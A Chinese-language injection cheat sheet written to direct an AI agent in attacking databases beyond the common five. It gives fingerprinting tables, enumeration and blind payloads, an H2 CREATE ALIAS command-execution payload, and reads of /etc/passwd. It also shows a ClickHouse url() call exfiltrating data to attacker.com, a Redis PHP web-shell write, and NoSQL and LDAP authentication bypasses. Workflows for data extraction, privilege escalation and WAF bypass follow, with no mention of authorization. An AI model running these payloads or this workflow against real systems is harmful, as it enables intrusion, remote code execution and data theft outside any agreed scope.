# 其他数据库注入 (Other Injection)

> 本文档用于引导 AI Agent 在遇到 MySQL、SQLite、MSSQL、PostgreSQL、OracleSQL **以外**的数据库系统时，能够通过联网搜索获取相应资料并执行 SQL 注入测试。本文档提供通用方法论、数据库指纹识别技巧、各数据库的关键特征速查表，以及结构化的搜索策略。

## 目录

* [通用 SQL 注入测试框架](#通用-sql-注入测试框架)
    * [注入点检测](#注入点检测)
    * [通用测试流程](#通用测试流程)
* [数据库指纹识别](#数据库指纹识别)
    * [基于报错信息识别](#基于报错信息识别)
    * [基于语法差异识别](#基于语法差异识别)
    * [基于默认函数识别](#基于默认函数识别)
    * [基于字符串拼接识别](#基于字符串拼接识别)
* [其他关系型数据库注入速查](#其他关系型数据库注入速查)
    * [MariaDB](#mariadb)
    * [IBM DB2](#ibm-db2)
    * [SAP HANA](#sap-hana)
    * [Sybase / SAP ASE](#sybase--sap-ase)
    * [Informix](#informix)
    * [Firebird](#firebird)
    * [H2 Database](#h2-database)
    * [Apache Derby](#apache-derby)
    * [CockroachDB](#cockroachdb)
    * [TiDB](#tidb)
    * [ClickHouse](#clickhouse)
    * [Presto / Trino](#presto--trino)
* [云数据仓库注入速查](#云数据仓库注入速查)
    * [Snowflake](#snowflake)
    * [Amazon Redshift](#amazon-redshift)
    * [Google BigQuery](#google-bigquery)
* [NoSQL 注入概述](#nosql-注入概述)
    * [MongoDB NoSQL 注入](#mongodb-nosql-注入)
    * [Redis 注入](#redis-注入)
    * [CouchDB 注入](#couchdb-注入)
    * [Cassandra CQL 注入](#cassandra-cql-注入)
    * [LDAP 注入](#ldap-注入)
* [Agent 联网搜索指南](#agent-联网搜索指南)
    * [搜索策略](#搜索策略)
    * [关键词模板](#关键词模板)
    * [推荐信息源](#推荐信息源)
    * [搜索工作流](#搜索工作流)
* [参考资料](#参考资料)

---

## 通用 SQL 注入测试框架

无论目标使用何种数据库系统，以下测试框架均适用。

### 注入点检测

**字符串型注入点**：`SELECT * FROM table WHERE column = 'INPUT';`

```
' 			→ 报错则可能存在注入
'' 			→ 如果恢复正常则确认存在注入
' OR '1'='1 → 如果返回所有数据则确认存在注入
' OR '1'='2 → 应返回空/原始结果
```

**数字型注入点**：`SELECT * FROM table WHERE id = INPUT;`

```
1 AND 1=1   → 正常返回 (True)
1 AND 1=2   → 异常返回 (False)
1-0         → 正常返回
1-1         → 返回 id=0 的结果
```

**通用 payload 适应性判断**：

```sql
-- 单行注释差异
--              (大多数数据库)
#               (MySQL/MariaDB)
-- 字符串拼接差异
'||'test        (Oracle, PostgreSQL, SQLite)
'+'test         (MSSQL)
' 'test         (MySQL 空格拼接)
CONCAT('a','b') (MySQL, MariaDB, MSSQL 2012+)
```

### 通用测试流程

对于任何未知数据库，按以下步骤推进：

1. **识别注入点** — 确认参数是否可被注入（字符串型 / 数字型 / 搜索型）
2. **指纹识别** — 通过报错信息、语法差异等判断数据库类型（见下节）
3. **确认注入类型** — 测试 Union / Error / Blind / Time / OOB 哪种方式可用
4. **枚举信息** — 提取版本号、当前用户、当前数据库
5. **提取元数据** — 列出所有数据库、表、列（依赖于各数据库的系统表/视图）
6. **提取数据** — 从目标表中提取敏感数据
7. **权限探测** — 检查当前用户权限，探索文件读写、命令执行可能
8. **尝试提权** — 文件操作 / OS 命令执行 / 带外数据外带

---

## 数据库指纹识别

当不确定目标数据库类型时，使用以下技术进行识别。

### 基于报错信息识别

| 报错关键词 / 特征 | 数据库类型 |
|---|---|
| `You have an error in your SQL syntax` | MySQL / MariaDB |
| `supplied argument is not a valid MySQL` | MySQL |
| `MariaDB server version` | MariaDB |
| `Microsoft OLE DB Provider for SQL Server` / `Unclosed quotation mark` | MSSQL |
| `ERROR: syntax error at or near` | PostgreSQL |
| `ORA-01756` / `ORA-00933` / `Oracle error` | Oracle |
| `SQLite3::` / `SQLITE_ERROR` / `near "...": syntax error` | SQLite |
| `DB2 SQL Error` / `SQLCODE=-` / `SQLSTATE=` | IBM DB2 |
| `com.sap.db` / `SAP DBTech JDBC` | SAP HANA |
| `Sybase message` / `Adaptive Server Enterprise` | Sybase / SAP ASE |
| `org.h2.jdbc` / `Syntax error in SQL statement` (Java stack) | H2 Database |
| `org.apache.derby` | Apache Derby |
| `Dynamic SQL Error` / `Firebird` | Firebird |
| `Informix` / `ISAM error` | Informix |
| `Code: 62. DB::Exception` / `ClickHouse` | ClickHouse |
| `INVALID_CAST_ARGUMENT` / `PrestoException` / `TrinoException` | Presto / Trino |
| `Snowflake` / `SQL compilation error` | Snowflake |
| `Amazon Redshift` / `ERROR: 42601` | Redshift |
| `invalidQuery` / `Syntax error in SQL query` (BigQuery) | Google BigQuery |
| `CockroachDB` / `SQLSTATE 42601` (类 PostgreSQL) | CockroachDB |

### 基于语法差异识别

通过发送特定于某数据库的语法来判断类型：

```sql
-- MySQL / MariaDB 特有
SELECT /*!50000 1*/               -- 条件注释，仅 MySQL 执行
SELECT 1 FROM dual                -- MySQL 可选 dual（也支持不写 FROM）

-- MSSQL 特有
SELECT @@version                  -- 返回含 "Microsoft SQL Server" 的字符串
SELECT LEN('test')                -- MSSQL 用 LEN()，其他用 LENGTH()
WAITFOR DELAY '0:0:5'             -- MSSQL 特有延时

-- PostgreSQL 特有
SELECT version()                  -- 返回含 "PostgreSQL" 的字符串
SELECT pg_sleep(5)                -- PostgreSQL 特有延时
SELECT 'a'||'b'                   -- 字符串拼接用 ||

-- Oracle 特有
SELECT banner FROM v$version      -- Oracle 系统表
SELECT 1 FROM dual                -- Oracle 必须有 FROM dual
DBMS_PIPE.RECEIVE_MESSAGE('a',5)  -- Oracle 特有延时

-- SQLite 特有
SELECT sqlite_version()           -- SQLite 专用
SELECT 1                          -- 无需 FROM 子句

-- IBM DB2 特有
SELECT CURRENT SERVER FROM SYSIBM.SYSDUMMY1   -- DB2 必须有 FROM
SELECT versionnumber FROM sysibm.sysversions  -- DB2 版本

-- H2 特有
SELECT H2VERSION() FROM DUAL      -- H2 版本函数
```

### 基于默认函数识别

| 函数 / 表达式 | 支持的数据库 |
|---|---|
| `VERSION()` | MySQL, MariaDB, PostgreSQL, H2, ClickHouse |
| `@@version` | MySQL, MariaDB, MSSQL |
| `version()` | PostgreSQL, CockroachDB |
| `sqlite_version()` | SQLite |
| `v$version` | Oracle |
| `SERVERPROPERTY('edition')` | MSSQL |
| `DBMS_UTILITY.DB_VERSION` | Oracle |
| `CURRENT SERVER` | IBM DB2 |
| `H2VERSION()` | H2 |

### 基于字符串拼接识别

| 拼接方式 | 数据库 |
|---|---|
| `CONCAT('a','b')` | MySQL, MariaDB, MSSQL (2012+), PostgreSQL, ClickHouse |
| `'a' + 'b'` | MSSQL |
| `'a' \|\| 'b'` | PostgreSQL, Oracle, SQLite, DB2, H2, Firebird, CockroachDB |
| `'a' 'b'` (空格拼接) | MySQL, MariaDB |

---

## 其他关系型数据库注入速查

以下为每种数据库的核心注入特征。每个条目提供了**关键速查信息**和**联网搜索关键词**，以便 Agent 在需要时获取更详细的 payload。

### MariaDB

> MariaDB 是 MySQL 的分支，大部分语法兼容，但拥有一些独有特性。

**与 MySQL 的关键差异**：

| 特性 | 说明 |
|---|---|
| 注释 | 与 MySQL 一致：`#`, `-- `, `/**/`, `/*!...*/` |
| 版本 | `SELECT @@version` (返回值包含 `MariaDB`) |
| 特有函数 | `COLUMN_JSON()`, `COLUMN_CREATE()` (动态列) |
| 序列 | MariaDB 10.3+ 支持 `CREATE SEQUENCE` |
| 系统表 | `information_schema` 与 MySQL 一致，额外有 `mysql.column_stats` |
| 窗口函数 | MariaDB 10.2+ 支持 `ROW_NUMBER()`, `RANK()` 等 |

**独有报错注入函数**：

```sql
-- MariaDB 10.0+ 特有
AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))    -- 同 MySQL
AND (SELECT JSON_DETAILED(JSON_ARRAYAGG(version())))        -- MariaDB JSON 函数
```

**联网搜索关键词**：`MariaDB SQL injection cheat sheet`, `MariaDB specific injection techniques`, `MariaDB vs MySQL injection differences`

---

### IBM DB2

> IBM DB2 是企业级关系数据库，常见于银行、保险等大型企业环境。

| 特性 | 说明 |
|---|---|
| 注释 | `--` (单行), `/* */` (多行) |
| 版本 | `SELECT service_level FROM TABLE(sysproc.env_get_inst_info()) AS A` |
| 当前用户 | `SELECT CURRENT USER FROM SYSIBM.SYSDUMMY1` |
| 当前数据库 | `SELECT CURRENT SERVER FROM SYSIBM.SYSDUMMY1` |
| 系统表 | `SYSIBM.SYSTABLES`, `SYSIBM.SYSCOLUMNS`, `SYSCAT.TABLES`, `SYSCAT.COLUMNS` |
| 字符串拼接 | `'a' \|\| 'b'` 或 `CONCAT('a','b')` |
| 子串 | `SUBSTR(string, start, length)` |
| 延时 | `AND (SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1, SYSIBM.SYSTABLES AS T2, SYSIBM.SYSTABLES AS T3)>0` (笛卡尔积延时) |
| 限制行数 | `FETCH FIRST N ROWS ONLY` (不支持 `LIMIT`) |
| Dual 等价 | `SYSIBM.SYSDUMMY1` |

**枚举 payload**：

```sql
-- 列出所有数据库 (schemas)
SELECT SCHEMANAME FROM SYSCAT.SCHEMATA

-- 列出表
SELECT TABNAME FROM SYSCAT.TABLES WHERE TABSCHEMA='<SCHEMA>'

-- 列出列
SELECT COLNAME, TYPENAME FROM SYSCAT.COLUMNS WHERE TABNAME='<TABLE>' AND TABSCHEMA='<SCHEMA>'

-- 报错注入
SELECT * FROM SYSIBM.SYSDUMMY1 WHERE 1=CAST((SELECT CURRENT USER FROM SYSIBM.SYSDUMMY1) AS INTEGER)

-- 盲注
AND (SELECT COUNT(TABNAME) FROM SYSCAT.TABLES)>0
AND ASCII(SUBSTR((SELECT CURRENT USER FROM SYSIBM.SYSDUMMY1),1,1))>64

-- 堆叠查询（DB2 通常不支持通过 Web 应用的堆叠查询）

-- 文件读写
CALL SYSPROC.ADMIN_CMD('LOAD FROM /etc/passwd OF DEL INSERT INTO MYTABLE')
```

**联网搜索关键词**：`IBM DB2 SQL injection cheat sheet`, `DB2 error-based injection`, `DB2 blind injection techniques`, `DB2 SYSCAT tables enumeration`, `DB2 command execution injection`

---

### SAP HANA

> SAP HANA 是 SAP 的内存数据库平台，常见于 SAP ERP 环境。

| 特性 | 说明 |
|---|---|
| 注释 | `--` (单行), `/* */` (多行) |
| 版本 | `SELECT VERSION FROM SYS.M_DATABASE` |
| 当前用户 | `SELECT CURRENT_USER FROM DUMMY` |
| 当前数据库 | `SELECT DATABASE_NAME FROM SYS.M_DATABASE` |
| 系统表 | `SYS.TABLES`, `SYS.TABLE_COLUMNS`, `SYS.SCHEMAS` |
| Dual 等价 | `DUMMY` |
| 字符串拼接 | `'a' \|\| 'b'` 或 `CONCAT('a','b')` |
| 子串 | `SUBSTRING(string, start, length)` |
| 延时 | 无内建 SLEEP；可使用重计算查询 |

**枚举 payload**：

```sql
-- 列出 schemas
SELECT SCHEMA_NAME FROM SYS.SCHEMAS

-- 列出表
SELECT TABLE_NAME FROM SYS.TABLES WHERE SCHEMA_NAME='<SCHEMA>'

-- 列出列
SELECT COLUMN_NAME, DATA_TYPE_NAME FROM SYS.TABLE_COLUMNS WHERE TABLE_NAME='<TABLE>'

-- 报错注入
SELECT CAST((SELECT CURRENT_USER FROM DUMMY) AS INTEGER) FROM DUMMY
```

**联网搜索关键词**：`SAP HANA SQL injection`, `SAP HANA SYS tables enumeration`, `HANA database penetration testing`, `SAP HANA error-based injection`

---

### Sybase / SAP ASE

> Sybase (现为 SAP Adaptive Server Enterprise) 与 MSSQL 有共同祖先，语法相似但有差异。

| 特性 | 说明 |
|---|---|
| 注释 | `--`, `/* */` |
| 版本 | `SELECT @@version` |
| 当前用户 | `SELECT SUSER_NAME()` |
| 当前数据库 | `SELECT DB_NAME()` |
| 系统表 | `sysobjects`, `syscolumns`, `syslogins` |
| 字符串拼接 | `'a' + 'b'` |
| 延时 | `WAITFOR DELAY '0:0:5'` |
| 子串 | `SUBSTRING(string, start, length)` |

**与 MSSQL 的关键差异**：
- 不支持 `xp_cmdshell`（除非手动安装扩展存储过程）
- `TOP` 语法：`SELECT TOP 1 name FROM sysobjects` 与 MSSQL 一致
- 堆叠查询支持（使用 `;`）

**联网搜索关键词**：`Sybase ASE SQL injection`, `SAP ASE injection cheat sheet`, `Sybase vs MSSQL injection differences`, `Sybase system tables enumeration`

---

### Informix

> IBM Informix 是企业级数据库，常见于嵌入式系统和 IoT 场景。

| 特性 | 说明 |
|---|---|
| 注释 | `--`, `{...}` (花括号注释, Informix 特有) |
| 版本 | `SELECT DBINFO('version', 'full') FROM systables WHERE tabid=1` |
| 当前用户 | `SELECT USER FROM systables WHERE tabid=1` |
| 当前数据库 | `SELECT DBINFO('dbname') FROM systables WHERE tabid=1` |
| 系统表 | `systables`, `syscolumns`, `sysindexes` |
| 字符串拼接 | `'a' \|\| 'b'` |
| 限制行数 | `FIRST N` (如 `SELECT FIRST 1 * FROM table`) |

**枚举 payload**：

```sql
-- 列出表
SELECT tabname FROM systables WHERE tabtype='T'

-- 列出列
SELECT colname, coltype FROM syscolumns WHERE tabid=(SELECT tabid FROM systables WHERE tabname='<TABLE>')
```

**联网搜索关键词**：`Informix SQL injection`, `Informix systables enumeration`, `IBM Informix injection cheat sheet`, `Informix DBINFO injection`

---

### Firebird

> Firebird 是开源的关系数据库，从 Borland InterBase 分支而来。

| 特性 | 说明 |
|---|---|
| 注释 | `--`, `/* */` |
| 版本 | `SELECT RDB$GET_CONTEXT('SYSTEM', 'ENGINE_VERSION') FROM RDB$DATABASE` |
| 当前用户 | `SELECT CURRENT_USER FROM RDB$DATABASE` |
| 当前数据库 | `SELECT RDB$GET_CONTEXT('SYSTEM', 'DB_NAME') FROM RDB$DATABASE` |
| 系统表 | `RDB$RELATIONS` (表), `RDB$RELATION_FIELDS` (列) |
| Dual 等价 | `RDB$DATABASE` |
| 字符串拼接 | `'a' \|\| 'b'` |
| 子串 | `SUBSTRING(string FROM start FOR length)` |

**枚举 payload**：

```sql
-- 列出表
SELECT RDB$RELATION_NAME FROM RDB$RELATIONS WHERE RDB$SYSTEM_FLAG=0

-- 列出列
SELECT RDB$FIELD_NAME FROM RDB$RELATION_FIELDS WHERE RDB$RELATION_NAME='<TABLE>'

-- 报错注入
SELECT CAST((SELECT RDB$RELATION_NAME FROM RDB$RELATIONS ROWS 1) AS INTEGER) FROM RDB$DATABASE
```

**联网搜索关键词**：`Firebird SQL injection`, `Firebird RDB$ system tables`, `Firebird injection cheat sheet`, `Firebird error-based injection`

---

### H2 Database

> H2 是一个轻量级的 Java 嵌入式数据库，常见于 Java 应用（Spring Boot 默认内存数据库）。

| 特性 | 说明 |
|---|---|
| 注释 | `--`, `//` (H2 特有), `/* */` |
| 版本 | `SELECT H2VERSION()` |
| 当前用户 | `SELECT CURRENT_USER()` 或 `SELECT USER()` |
| 系统表 | `INFORMATION_SCHEMA.TABLES`, `INFORMATION_SCHEMA.COLUMNS` |
| 字符串拼接 | `'a' \|\| 'b'` 或 `CONCAT('a','b')` |
| 延时 | `CALL SLEEP(5)` (H2 特有) |

**关键特性 — 命令执行**：

```sql
-- H2 允许创建链接到 Java 类的别名函数 (ALIAS)，可实现 RCE
CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd);return "done";}';
CALL EXEC('whoami');

-- 通过 FILE_READ 读取文件
SELECT FILE_READ('/etc/passwd');

-- 通过 FILE_WRITE 写入文件 (较新版本可能受限)
SELECT FILE_WRITE('data', '/tmp/test.txt');

-- 使用 CSVREAD 读取文件
SELECT * FROM CSVREAD('/etc/passwd');
```

:warning: H2 的 `CREATE ALIAS` 是一个非常危险的 RCE 向量，在 Spring Boot Actuator 暴露 H2 Console 的场景中尤为常见。

**联网搜索关键词**：`H2 database SQL injection RCE`, `H2 CREATE ALIAS command execution`, `H2 database injection cheat sheet`, `Spring Boot H2 console exploitation`

---

### Apache Derby

> Apache Derby (也称 Java DB) 是 Apache 的纯 Java 嵌入式数据库。

| 特性 | 说明 |
|---|---|
| 注释 | `--`, `/* */` |
| 版本 | `SELECT * FROM SYSIBM.SYSVERSIONS` |
| 当前用户 | `VALUES CURRENT_USER` 或 `SELECT CURRENT_USER FROM SYSIBM.SYSDUMMY1` |
| 系统表 | `SYS.SYSTABLES`, `SYS.SYSCOLUMNS`, `SYSIBM.SYSTABLES` |
| 字符串拼接 | `'a' \|\| 'b'` |
| 限制行数 | `FETCH FIRST N ROWS ONLY` |
| Dual 等价 | `SYSIBM.SYSDUMMY1` 或使用 `VALUES` 表达式 |

**联网搜索关键词**：`Apache Derby SQL injection`, `Java DB injection cheat sheet`, `Derby SYS.SYSTABLES enumeration`

---

### CockroachDB

> CockroachDB 兼容 PostgreSQL 协议和语法，但有一些差异。

| 特性 | 说明 |
|---|---|
| 注释 | `--`, `/* */` |
| 版本 | `SELECT version()` (返回值含 `CockroachDB`) |
| 当前用户 | `SELECT current_user` |
| 当前数据库 | `SELECT current_database()` |
| 系统表 | `information_schema.tables`, `information_schema.columns` (兼容 PostgreSQL) |
| 延时 | `SELECT pg_sleep(5)` |
| 特有表 | `crdb_internal.tables`, `crdb_internal.databases` |

**注意**：大部分 PostgreSQL 注入 payload 可直接使用，但 CockroachDB 不支持部分 PostgreSQL 函数如 `lo_import`, `COPY TO/FROM PROGRAM` 等。

**联网搜索关键词**：`CockroachDB SQL injection`, `CockroachDB vs PostgreSQL injection`, `CockroachDB crdb_internal enumeration`

---

### TiDB

> TiDB 兼容 MySQL 协议和语法，是 PingCAP 开发的分布式数据库。

| 特性 | 说明 |
|---|---|
| 注释 | 与 MySQL 一致：`#`, `-- `, `/* */` |
| 版本 | `SELECT version()` (返回值含 `TiDB`) 或 `SELECT TIDB_VERSION()` |
| 系统表 | `information_schema` (兼容 MySQL), 额外有 `INFORMATION_SCHEMA.TIDB_*` |
| 延时 | `SELECT SLEEP(5)` |

**注意**：大部分 MySQL 注入 payload 可直接使用，但 TiDB 不支持 `LOAD_FILE()`, `INTO OUTFILE/DUMPFILE`, UDF 等文件/OS 操作。

**联网搜索关键词**：`TiDB SQL injection`, `TiDB vs MySQL injection differences`, `TiDB INFORMATION_SCHEMA enumeration`

---

### ClickHouse

> ClickHouse 是 Yandex 开发的列式 OLAP 数据库，常用于日志分析和大数据场景。

| 特性 | 说明 |
|---|---|
| 注释 | `--`, `/* */` |
| 版本 | `SELECT version()` |
| 当前用户 | `SELECT currentUser()` |
| 当前数据库 | `SELECT currentDatabase()` |
| 系统表 | `system.tables`, `system.columns`, `system.databases` |
| 字符串拼接 | `concat('a','b')` 或 `'a' \|\| 'b'` |
| 延时 | `SELECT sleep(5)` 或 `SELECT sleepEachRow(1)` |
| 限制行数 | `LIMIT N` |

**枚举 payload**：

```sql
-- 列出数据库
SELECT name FROM system.databases

-- 列出表
SELECT name FROM system.tables WHERE database='<DB>'

-- 列出列
SELECT name, type FROM system.columns WHERE table='<TABLE>' AND database='<DB>'

-- 读取文件 (需要权限)
SELECT * FROM file('/etc/passwd', 'RawBLOB')

-- URL 表函数 (OOB)
SELECT * FROM url('http://attacker.com/?data=' || version(), RawBLOB, 'x String')
```

**联网搜索关键词**：`ClickHouse SQL injection`, `ClickHouse system tables enumeration`, `ClickHouse injection cheat sheet`, `ClickHouse file function injection`

---

### Presto / Trino

> Presto (现称 Trino) 是分布式 SQL 查询引擎，常用于查询异构数据源。

| 特性 | 说明 |
|---|---|
| 注释 | `--`, `/* */` |
| 版本 | 通过 HTTP 头或 `SELECT node_version FROM system.runtime.nodes LIMIT 1` |
| 当前用户 | `SELECT CURRENT_USER` |
| 系统表 | `information_schema.tables`, `information_schema.columns` |
| 字符串拼接 | `'a' \|\| 'b'` 或 `CONCAT('a','b')` |
| 延时 | 无内建 SLEEP |

**联网搜索关键词**：`Presto SQL injection`, `Trino SQL injection`, `Presto information_schema enumeration`

---

## 云数据仓库注入速查

### Snowflake

> Snowflake 是云原生数据仓库，广泛用于企业数据分析。

| 特性 | 说明 |
|---|---|
| 注释 | `--`, `/* */` |
| 版本 | `SELECT CURRENT_VERSION()` |
| 当前用户 | `SELECT CURRENT_USER()` |
| 当前数据库 | `SELECT CURRENT_DATABASE()` |
| 系统表 | `INFORMATION_SCHEMA.TABLES`, `INFORMATION_SCHEMA.COLUMNS` |
| 账户信息 | `SELECT CURRENT_ACCOUNT()`, `SELECT CURRENT_ROLE()` |
| 延时 | `CALL SYSTEM$WAIT(5)` (秒) 或 `CALL SYSTEM$WAIT(5, 'SECONDS')` |
| 字符串拼接 | `'a' \|\| 'b'` 或 `CONCAT('a','b')` |

**枚举 payload**：

```sql
-- 列出数据库
SELECT DATABASE_NAME FROM INFORMATION_SCHEMA.DATABASES
SHOW DATABASES

-- 列出 schemas
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA

-- 列出表
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='<SCHEMA>'

-- 列出列
SELECT COLUMN_NAME, DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='<TABLE>'

-- 报错注入
SELECT TO_NUMBER((SELECT CURRENT_USER()))
```

**联网搜索关键词**：`Snowflake SQL injection`, `Snowflake INFORMATION_SCHEMA enumeration`, `Snowflake injection techniques`, `Snowflake penetration testing`

---

### Amazon Redshift

> Amazon Redshift 基于 PostgreSQL 8.0.2 修改，语法类似但有差异。

| 特性 | 说明 |
|---|---|
| 注释 | `--`, `/* */` |
| 版本 | `SELECT version()` (返回含 `Redshift`) |
| 当前用户 | `SELECT CURRENT_USER` |
| 当前数据库 | `SELECT CURRENT_DATABASE()` |
| 系统表 | `information_schema.tables`, `pg_catalog.pg_tables`, `SVV_TABLES` |
| 延时 | 无 `pg_sleep()`；可使用重查询延时 |
| 字符串拼接 | `'a' \|\| 'b'` |

**注意**：Redshift 不支持 `pg_sleep()`、`COPY TO/FROM PROGRAM`、`lo_import` 等 PostgreSQL 高级功能。

**联网搜索关键词**：`Amazon Redshift SQL injection`, `Redshift vs PostgreSQL injection`, `Redshift SVV tables enumeration`, `Redshift penetration testing`

---

### Google BigQuery

> Google BigQuery 使用类 SQL 语法 (Standard SQL / Legacy SQL)，作为全托管数据仓库运行。

| 特性 | 说明 |
|---|---|
| 注释 | `--`, `/* */` |
| 当前用户 | `SELECT SESSION_USER()` |
| 系统表 | `<PROJECT>.<DATASET>.INFORMATION_SCHEMA.TABLES`, `<PROJECT>.<DATASET>.INFORMATION_SCHEMA.COLUMNS` |
| 字符串拼接 | `CONCAT('a','b')` 或 `'a' \|\| 'b'` |
| 延时 | 无内建 SLEEP |

**关键差异**：
- BigQuery 使用反引号 `` ` `` 包裹表名：`` SELECT * FROM `project.dataset.table` ``
- 不支持堆叠查询
- 不支持 `UNION` 与不同类型的列
- 不支持文件读写或命令执行

**联网搜索关键词**：`Google BigQuery SQL injection`, `BigQuery INFORMATION_SCHEMA`, `BigQuery injection techniques`, `BigQuery penetration testing`

---

## NoSQL 注入概述

虽然不是传统 SQL 注入，但 NoSQL 注入在现代应用中日益常见。

### MongoDB NoSQL 注入

> MongoDB 使用 BSON/JSON 查询语法，注入方式与 SQL 完全不同。

**常见注入类型**：

| 注入类型 | 示例 |
|---|---|
| 认证绕过 | `{"username": {"$gt": ""}, "password": {"$gt": ""}}` |
| 运算符注入 | `username[$ne]=invalid&password[$ne]=invalid` |
| 正则匹配 | `{"username": {"$regex": "^admin"}}` |
| `$where` 注入 | `{"$where": "this.username == 'admin' && this.password.length > 0"}` |
| JavaScript 注入 | `'; return true; var dummy='` (在 `$where` 中) |
| `$lookup` 聚合 | 通过聚合管道跨集合提取数据 |

**枚举方法**：

```javascript
// 通过 $regex 逐字符提取数据
{"username": "admin", "password": {"$regex": "^a"}}   // 测试密码是否以 'a' 开头
{"username": "admin", "password": {"$regex": "^ab"}}  // 测试密码是否以 'ab' 开头

// 通过 $gt / $lt 进行二分搜索
{"username": "admin", "password": {"$gt": "m"}}       // 密码首字母 > m ?
```

**联网搜索关键词**：`MongoDB NoSQL injection`, `MongoDB operator injection`, `MongoDB $where injection`, `MongoDB authentication bypass`, `NoSQL injection cheat sheet`

---

### Redis 注入

> 当应用直接拼接用户输入到 Redis 命令中时产生。

**常见注入 payload**：

```
-- CRLF 注入（通过换行注入额外 Redis 命令）
\r\nSET injected_key injected_value\r\n

-- 通过 EVAL 执行 Lua 脚本
EVAL "return redis.call('keys','*')" 0

-- 文件写入 (利用 Redis 持久化)
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET payload "<?php system($_GET['cmd']); ?>"
SAVE
```

**联网搜索关键词**：`Redis injection`, `Redis CRLF injection`, `Redis SSRF exploitation`, `Redis unauthorized access RCE`

---

### CouchDB 注入

> CouchDB 使用 HTTP REST API 和 JSON 文档，注入发生在 Mango 查询或视图函数中。

**常见注入 payload**：

```json
// Mango 查询注入 — 认证绕过
{"selector": {"username": "admin", "password": {"$gt": ""}}}

// 通过 $regex
{"selector": {"username": {"$regex": "^admin"}}}
```

**联网搜索关键词**：`CouchDB injection`, `CouchDB Mango query injection`, `CouchDB REST API exploitation`

---

### Cassandra CQL 注入

> Apache Cassandra 使用 CQL (Cassandra Query Language)，语法类似 SQL 但功能有限。

| 特性 | 说明 |
|---|---|
| 注释 | `--`, `/* */` |
| 版本 | `SELECT release_version FROM system.local` |
| 系统表 | `system_schema.tables`, `system_schema.columns`, `system_schema.keyspaces` |
| 特点 | 不支持 `UNION`、子查询、`JOIN`；注入面相对较小 |

**联网搜索关键词**：`Cassandra CQL injection`, `CQL injection techniques`, `Cassandra system_schema enumeration`

---

### LDAP 注入

> LDAP 注入发生在应用将用户输入直接拼接到 LDAP 查询过滤器中时。

**常见注入 payload**：

```
-- 认证绕过
*)(&
*)(|(&
admin)(&)
admin)(|(password=*))

-- 布尔盲注
(uid=admin)(|(password=a*))   → 测试密码是否以 'a' 开头

-- LDAP 过滤器注入
*)(objectClass=*))(|(uid=*   → 提取所有用户
```

**联网搜索关键词**：`LDAP injection cheat sheet`, `LDAP filter injection`, `LDAP authentication bypass`, `LDAP blind injection`

---

## Agent 联网搜索指南

当遇到上述未详细覆盖的数据库，或需要最新的 payload 和技术时，Agent 应遵循以下搜索策略。

### 搜索策略

1. **先识别，再搜索** — 首先通过指纹识别确定数据库类型，然后针对性搜索
2. **从权威源开始** — 优先搜索 PayloadsAllTheThings、HackTricks、NetSPI SQL Wiki 等权威资源
3. **分阶段搜索** — 按测试流程逐步搜索：枚举 → 注入技术 → 提权 → 命令执行
4. **版本敏感** — 搜索时包含数据库版本号，不同版本的可用 payload 差异巨大
5. **多源交叉验证** — 对关键 payload 从多个来源进行交叉验证

### 关键词模板

根据测试阶段，使用以下搜索关键词模板（将 `{DB}` 替换为实际数据库名称）：

**基础信息收集**：
```
{DB} SQL injection cheat sheet
{DB} injection techniques
{DB} system tables enumeration
{DB} default databases
{DB} comment syntax
```

**注入技术细节**：
```
{DB} union-based injection
{DB} error-based injection payload
{DB} blind injection techniques
{DB} time-based injection sleep function
{DB} stacked queries injection
{DB} out-of-band injection DNS exfiltration
```

**后利用 (Post-Exploitation)**：
```
{DB} read file injection
{DB} write file injection
{DB} command execution injection RCE
{DB} privilege escalation injection
{DB} database credentials extraction
{DB} WAF bypass injection
```

**特定场景**：
```
{DB} version {VERSION_NUMBER} specific injection
{DB} injection through {FRAMEWORK/LANGUAGE}
{DB} injection with prepared statements bypass
{DB} second-order injection
```

### 推荐信息源

| 优先级 | 来源 | URL / 说明 |
|---|---|---|
| 1 | PayloadsAllTheThings | `github.com/swisskyrepo/PayloadsAllTheThings` — 最全面的 payload 集合 |
| 2 | HackTricks | `book.hacktricks.wiki` — 渗透测试全流程参考 |
| 3 | NetSPI SQL Injection Wiki | `sqlwiki.netspi.com` — 专注于 SQL 注入的百科 |
| 4 | PortSwigger Web Security Academy | `portswigger.net/web-security/sql-injection` — SQL 注入教程和实验 |
| 5 | OWASP | `owasp.org/www-community/attacks/SQL_Injection` — 安全标准和指南 |
| 6 | 官方数据库文档 | 各数据库官方 SQL 参考文档（用于确认函数和语法） |
| 7 | exploit-db / Packet Storm | 真实漏洞利用和 PoC 参考 |

### 搜索工作流

当 Agent 遇到未知或不熟悉的数据库时，应执行以下工作流：

```
步骤 1：数据库指纹识别
├── 检查报错信息中的数据库关键词
├── 测试各数据库特有的语法/函数
└── 确定数据库类型和大致版本

步骤 2：获取注入参考资料
├── 搜索："{DB} SQL injection cheat sheet"
├── 搜索："{DB} injection PayloadsAllTheThings"
├── 搜索："{DB} injection HackTricks"
└── 整理：注释语法、系统表、关键函数

步骤 3：确认可用注入技术
├── 测试 UNION SELECT（确定列数）
├── 测试报错注入（CAST/CONVERT 等类型转换）
├── 测试布尔盲注（AND 1=1 / AND 1=2）
├── 测试时间盲注（搜索该数据库的延时函数）
└── 测试堆叠查询（分号分隔）

步骤 4：枚举数据库结构
├── 搜索："{DB} list databases injection"
├── 搜索："{DB} list tables system catalog"
├── 搜索："{DB} list columns system tables"
└── 提取：数据库 → 表 → 列 → 数据

步骤 5：后利用探索
├── 搜索："{DB} file read injection"
├── 搜索："{DB} command execution SQL injection"
├── 搜索："{DB} privilege escalation"
└── 搜索："{DB} out-of-band data exfiltration"

步骤 6：WAF/过滤器绕过（如有需要）
├── 搜索："{DB} WAF bypass SQL injection"
├── 搜索："{DB} filter evasion techniques"
├── 搜索："{DB} encoding bypass injection"
└── 测试：大小写变换、编码、注释插入、等价函数替换
```

---

## 参考资料

